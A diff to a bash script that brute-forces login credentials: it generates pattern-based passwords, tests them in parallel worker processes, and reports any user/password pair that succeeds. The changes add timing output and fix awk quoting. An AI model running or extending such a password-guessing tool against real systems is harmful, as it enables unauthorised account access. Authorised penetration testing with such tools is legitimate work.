@@ -175,7 +175,7 @@ echo "✅ Parallel Scan Complete."
 if [ -n "$success_file" ]; then
     echo "🎯 FOUND SUCCESS!"
     success_line=$(grep "SUCCESS" "$success_file" | head -n 1)
-    creds=$(echo "$success_line" | awk -F'Testing: ' '{print $2}' | awk -F' ' '{print $1}')
+    creds=$(echo "$success_line" | awk -F"Testing: " "{print \$2}" | awk -F" " "{print \$1}")
     echo "👤 User/Pass: $creds"
     grep -h "Response:" "$success_file"
     exit 0
@@ -194,11 +194,11 @@ else
     fi
 
     echo "--- 🔥 Phase 2: Radical 'From Scratch' Search ---"
+    T3_START=$(date +%s)
     rm -rf "$TEMP_DIR"
     mkdir -p "$TEMP_DIR"
     
     # Generate broad pattern passwords without seeds
-    # We double the GEN_COUNT for a broader search
     PHASE2_COUNT=$(( GEN_COUNT * 2 ))
     echo "📦 Generating $PHASE2_COUNT unique passwords from scratch (Pattern Search)..."
     
@@ -227,17 +227,20 @@ else
         found_log=$(grep -l "SUCCESS" "$TEMP_DIR"/*.log 2>/dev/null | head -n 1)
         if [ -n "$found_log" ]; then
             for pid in "${pids_brute[@]}"; do kill "$pid" 2>/dev/null; done
-            echo -e "\n🎯 FOUND SUCCESS IN PHASE 2!"
+            T3_END=$(date +%s)
+            T3_DUR=$(( T3_END - T3_START ))
+            echo -e "\n🎯 FOUND SUCCESS IN PHASE 2! (Duration: ${T3_DUR}s)"
             grep -h -B 1 "SUCCESS" "$found_log"
             exit 0
         fi
 
-        tested_count=$(grep -c "Testing:" "$TEMP_DIR"/*.log 2>/dev/null | awk -F: '{sum+=$2} END {print sum+0}')
+        tested_count=$(grep -c "Testing:" "$TEMP_DIR"/*.log 2>/dev/null | awk -F":" "{sum+=\$2} END {print sum+0}")
         printf "\r   ⮕  Progress: %d/%d" "$tested_count" "$PHASE2_COUNT"
         
         if [ "$still_running" -eq 0 ]; then break; fi
         sleep 1
     done
-    
-    echo -e "\n❌ Phase 2 complete. No credentials found."
+    T3_END=$(date +%s)
+    T3_DUR=$(( T3_END - T3_START ))
+    echo -e "\n❌ Phase 2 complete. No credentials found. (Duration: ${T3_DUR}s)"
 fi
